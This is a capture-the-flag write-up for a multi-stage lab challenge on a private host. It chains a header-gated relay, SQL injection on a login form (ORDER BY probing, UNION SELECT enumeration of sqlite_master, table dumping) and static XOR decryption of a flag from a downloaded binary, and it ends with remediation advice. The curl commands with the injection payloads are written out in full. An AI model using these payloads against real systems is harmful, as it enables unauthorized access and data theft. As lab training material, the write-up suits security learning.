# The Convergence Protocol

## Overview

"The Convergence Protocol" is a four-gate, multi-stage challenge served on port 8095 of the
TAPROBANE-themed box (`192.168.45.128`). The flag is not handed out by any single service —
it must be assembled by chaining fragments recovered from successive gates:

1. a **port-knock gate** that reveals the first fragment,
2. a **login form whose SQL schema is regenerated every session** (SQL injection),
3. a scripting-language gate (20-second clock),
4. a downloadable **vault binary** whose secret "lives only while the program breathes".

The final flag is recovered by combining fragment 1 (`CONV3RG3NCE_S1_`) with fragment 2
(`S2_QU3RY_M4ST3R_`) into the vault's "convergence key", which unlocks an XOR-decryption of the
flag from the binary's own `.rodata` section.

---

## Recon

First pass was a full TCP SYN scan:

```bash
nmap -sS -p- -T4 192.168.45.128
# 22/ssh, 8080-8097, 8099, 31337 (Elite)
```

Curling the challenge port (8095) immediately returned a "STAGE 1 — GATE BREACHED" page
containing the first fragment:

```
Fragment recovered: CONV3RG3NCE_S1_
Analyst Note: Stage 2 requires this value plus something you'll extract from
a service that isn't listed in any scan you've run so far.
```

Mapping the neighbouring ports revealed the shape of the whole challenge:

| Port  | What it is |
|-------|------------|
| 8095  | Stage 1 result (fragment 1) |
| 8096  | **False door** — decoy flag `MAHASONA{convergence_gate_bypassed}` |
| 8099  | Stage 4 — `/download` serves the `w15_vault` binary |
| 31337 | Relay — `403 Missing convergence fragment header` |

The 31337 relay only answered when given a specific HTTP header, which confirmed the gates are
chained through header-based progression rather than separate ports.

---

## Analysis

Three concrete vulnerabilities chain together into the solve.

### 1. Header-based gate relay (31337)

Sending the fragment 1 value as an HTTP header unlocks Stage 2:

```bash
curl -H "X-Convergence-Fragment: CONV3RG3NCE_S1_" http://192.168.45.128:31337/
# -> [STAGE 2 — ANALYST LOGIN] login form
```

The relay compares the header against literal fragment strings; each accepted fragment opens the
next gate. **Why it is weak:** the "secret" is a static, guessable string embedded in the service
and leaked across stages — obscurity, not authentication.

### 2. SQL injection with a per-session schema (Stage 2 login)

The login page warns *"Every analyst session gets an isolated backend. Schema details are not
shared across sessions."* A failed login returns `NO MATCHING RECORDS`, but a malformed payload
triggers a **debug echo of the attempted query**:

```
SELECT id, username FROM accounts WHERE username = '<input>' AND password = '<input>'
```

The input is concatenated straight into the query — no parameterisation — so
`' OR 1=1--` bypasses auth and returns `(1, 'analyst')`. The Flask session cookie itself stores
the randomised identifiers (`vault_table`, `secret_col`), which is *why* "the shape is reborn
every session": table and column names are random per session to frustrate blind guessing.

Enumerating `sqlite_master` via `UNION SELECT` reveals the full schema each session:

```
CREATE TABLE accounts     (id INTEGER PRIMARY KEY, username TEXT, password TEXT)
CREATE TABLE admin_backup (note TEXT)
CREATE TABLE vault_exgczp (secret_7701kz TEXT)   -- random names every session
```

Dumping these tables yields fragment 2 (`S2_QU3RY_M4ST3R_`) and its decoy
(`S2_QU3RY_M4ST3R_DECOY`), plus the real credential `analyst : ChangeMe123`.

### 3. XOR-obfuscated flag inside the vault binary (Stage 4)

`w15_vault` (stripped PIE ELF) asks for a "combined convergence key" and `strcmp`s it against
`CONV3RG3NCE_S1_S2_QU3RY_M4ST3R_` — i.e. fragment1 + fragment2. On success it:

- builds two **decoy** flags in plaintext on the stack
  (`MAHASONA{v4ult_k3y_candidate_alpha}`, `MAHASONA{static_memory_residue_beta}`),
- XOR-decrypts a 40-byte blob from `.rodata` (offset `0x2020`) with the key `VAULT_9K2`
  (at offset `0x2108`) into a stack buffer,
- checks the first byte is `M`, then **`memset`s the buffer to zero** before exiting.

**Why it exists:** the challenge author wanted the "secret that never touches disk" — so the flag
is never stored in plaintext and is wiped after use. But because *both* the ciphertext and the XOR
key ship inside the binary, the flag is fully recoverable statically. XOR is not encryption, and
the `memset` only prevents the flag from being *printed*; it does nothing to stop a reverse
engineer from decrypting the embedded blob. This is the classic "obfuscation is not security"
trap.

---

## Exploitation

### Step 1 — Fragment 1

```bash
curl -s http://192.168.45.128:8095/          # -> CONV3RG3NCE_S1_
```

### Step 2 — Fragment 2 (SQL injection)

```bash
# Open Stage 2 with fragment 1 as the relay header
curl -s -c c.txt -H "X-Convergence-Fragment: CONV3RG3NCE_S1_" \
  http://192.168.45.128:31337/

# Debug mode leaks the query + column count (ORDER BY error)
curl -s -b c.txt -H "X-Convergence-Fragment: CONV3RG3NCE_S1_" \
  -X POST --data-urlencode "username=' ORDER BY 3--" --data-urlencode "password=x" \
  http://192.168.45.128:31337/login
# -> "1st ORDER BY term out of range - should be between 1 and 2"
# -> SELECT id, username FROM accounts WHERE username = '' ORDER BY 3--' ...

# Enumerate tables (names are randomised per session)
curl -s -b c.txt -H "X-Convergence-Fragment: CONV3RG3NCE_S1_" \
  -X POST --data-urlencode "username=' UNION SELECT name,1 FROM sqlite_master WHERE type='table'--" \
  --data-urlencode "password=x" http://192.168.45.128:31337/login
# -> accounts, admin_backup, vault_exgczp

# Extract fragment 2 from the (per-session) vault table/column
curl -s -b c.txt -H "X-Convergence-Fragment: CONV3RG3NCE_S1_" \
  -X POST --data-urlencode "username=' UNION SELECT secret_7701kz,1 FROM vault_exgczp--" \
  --data-urlencode "password=x" http://192.168.45.128:31337/login
# -> S2_QU3RY_M4ST3R_   (decoy in admin_backup: S2_QU3RY_M4ST3R_DECOY)
```

### Step 3 — Decrypt the vault flag

```bash
curl -s -o w15_vault http://192.168.45.128:8099/download
file w15_vault   # ELF 64-bit LSB pie executable, x86-64, stripped
```

```python
data = open('w15_vault', 'rb').read()
ct   = data[0x2020:0x2020 + 40]                 # ciphertext blob in .rodata
key  = data[0x2108:0x2112].split(b'\x00')[0]    # b'VAULT_9K2'
flag = bytes(ct[i] ^ key[i % len(key)] for i in range(40))
print(flag.decode())
```

```
MAHASONA{runtime_vault_memory_extracted}
```

The combined convergence key (`CONV3RG3NCE_S1_S2_QU3RY_M4ST3R_`) is verified locally: feeding it
to the binary yields `ACCESS GRANTED. Verification complete. Vault sealed.` — confirming the flag
is the one decrypted in memory, not either of the two plaintext decoys.

---

## The Flag

```
MAHASONA{runtime_vault_memory_extracted}
```

Recovered by XOR-decrypting the 40-byte `.rodata` blob in `w15_vault` (key `VAULT_9K2`),
unlocked by the convergence key `CONV3RG3NCE_S1_S2_QU3RY_M4ST3R_` (fragment1 + fragment2).

---

## Remediation

- **SQL injection:** use parameterised queries (prepared statements) instead of string
  concatenation, and never echo raw SQL errors ("debug mode") to clients. The per-session schema
  randomisation is security-through-obscurity and does not stop `UNION`-based enumeration.
- **Vault binary:** never embed secrets — obfuscated or not — in a client-downloadable binary.
  Key material and the decoy/real flags were all trivially recoverable with `strings`/static
  analysis. Verification should be server-side: the client submits the fragments, and the server
  returns the flag only after validating the full chain. If a local check is unavoidable, never
  store the key next to the ciphertext, and use real key-derivation/anti-tamper measures (which
  still only *slow* a determined reverse engineer).
- **Header-based gating:** replace the static, guessable fragment string in the HTTP header with
  signed, expiring, per-user session tokens that track progression state server-side.
- **Port knocking:** treat it as obscurity, not access control — pair it with real authentication
  (SSH keys, mTLS, VPN) instead of relying on the knock alone.
